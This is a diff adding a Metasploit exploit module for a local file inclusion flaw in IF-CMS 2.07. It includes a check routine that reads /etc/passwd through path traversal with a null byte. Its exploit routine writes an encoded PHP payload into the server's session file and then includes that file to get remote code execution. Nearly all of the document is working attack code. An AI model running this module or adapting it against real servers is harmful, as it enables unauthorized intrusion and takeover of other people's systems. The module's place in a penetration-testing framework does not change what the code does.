@@ -1,0 +1,155 @@
+##
+# $Id: if-cms.rb 2011-03-15 20:28:10 tecr0c $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+# -*- coding: utf-8 -*-
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ManualRanking
+
+	PHPSESSID_REGEX = /(?:^|;?)PHPSESSID=(\w+)(?:;|$)/
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'        => 'IF-CMS',
+			'Description' => %q{
+					Local File Inclusion vulnerability within IF-CMS 2.07 which allows
+					remote attackers to include and execute arbitrary local files via a ../ at the newlang
+					parameter within the index.php page.
+			},
+			'Author'      => ['TecR0c'],
+			'License'     => BSD_LICENSE,
+			'Version'     => '$Revision: $',
+			'References'  =>
+				[
+					['URL'     => 'http://sourceforge.net/projects/if-cms/'],
+				],
+			'Payload'     =>
+				{
+					# max header length for Apache (8190),
+					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
+					# minus 23 for good luck (and extra spacing)
+					'Space'       => 8190 - 23,
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'ConnectionType' => 'find',
+						},
+					'BadChars'    => "'\"`"  # quotes are escaped by PHP's magic_quotes_gpc in a default install
+				},
+			'Targets'        => [['If-CMS 2.07', {}]],
+			'DefaultTarget'  => 0,
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'DisclosureDate' => 'March 15 2011'
+		))
+
+		register_options(
+			[
+				OptString.new('URI',  [true, 'PHP file contains the vulnerable parameter', '/index.php']),
+				OptString.new('PATH', [true, 'Path where the php is stored', 'var/lib/php5/sess_!SESSIONID!']),
+			], self.class)
+	end
+
+	def check
+		urltotest = datastore['URI'] + "?newlang=" + ("../" * 8) + "etc/passwd%00"
+		target_code = 200
+
+		print_status "Attempting to POST to #{urltotest}"
+		response = send_request_cgi({'uri' => urltotest, 'method' => 'GET'})
+
+		unless defined? response
+			print_error 'Server did not respond to HTTP GET request'
+			return Exploit::CheckCode::Safe
+		end
+
+		code = response.code
+
+		unless code == target_code
+			print_error "Expected HTTP code #{target_code}, but got #{code}."
+			return Exploit::CheckCode::Safe
+		end
+
+		print_status "We received the expected HTTP code #{target_code}"
+
+		# We will need the cookie PHPSESSID to continue
+		cookies = response.headers['Set-Cookie']
+
+		# Make sure cookies were set
+		if defined? cookies and cookies =~ PHPSESSID_REGEX
+			print_status "We successfully sent a PHPSESSID of '#{$1}'"
+		else
+			print_error 'The server did not send us the cookie we were looking for'
+			return Exploit::CheckCode::Safe
+		end
+
+		# Check to see loca file inclusion is possible
+		if response.body =~ /root/
+			print_status "We were successfully able to validate gp_magic_quotes = Off"
+			return Exploit::CheckCode::Vulnerable
+		else
+			print_error 'The webserver seems to have gp_magic_quotes On'
+			return Exploit::CheckCode::Safe
+		end
+
+	end
+
+	def exploit
+		uri = datastore['URI']
+		# Prepare PHP file contents
+		encoded_php_file = Rex::Text.uri_encode("<?php #{payload.encoded} ?>")
+		urlpayload = datastore['URI'] + "?newlang=#{encoded_php_file}%00"
+
+		# Deliver the payload
+		print_status('Writing malicious payload to the remote server')
+		delivery_response = send_request_cgi({'uri' => urlpayload})
+
+		cookie = delivery_response.headers['Set-Cookie']
+
+		# Make sure cookie is set
+		if defined? cookie and cookie =~ PHPSESSID_REGEX
+			print_status "file containing payload is 'sess_#{$1}'"
+		else
+			print_error 'The server did not send us the cookie we were looking for'
+			return Exploit::CheckCode::Safe
+		end
+
+		# Make sure cookies were set
+		if cookie.nil?
+			raise RuntimeError, 'The server did not set any cookies'
+		end
+
+		# Contents of PHPSESSID. About to be set.
+		session_id = nil
+
+		# Retrieve the session id from PHPSESSID
+		if cookie =~ PHPSESSID_REGEX
+			session_id = $1
+		else
+			raise RuntimeError, 'The cookie PHPSESSID was not set.'
+		end
+
+		# The call should return HTTP code 200
+		if delivery_response.code != 200
+			raise RuntimeError, "Server returned unexpected HTTP code #{delivery_response.code}"
+		end
+
+		# Prepare the value that will execute our payload
+		detonation = datastore['PATH'].sub('!SESSIONID!', session_id)
+
+		# Small delay as we're just going to assume we succeeded.
+		urlsession = datastore['URI'] + "?newlang=" + ("../" * 8) + "#{detonation}%00"
+		send_request_cgi({'uri' => urlsession,'method' => 'GET'}, 0.01)
+		handler
+	end
+end
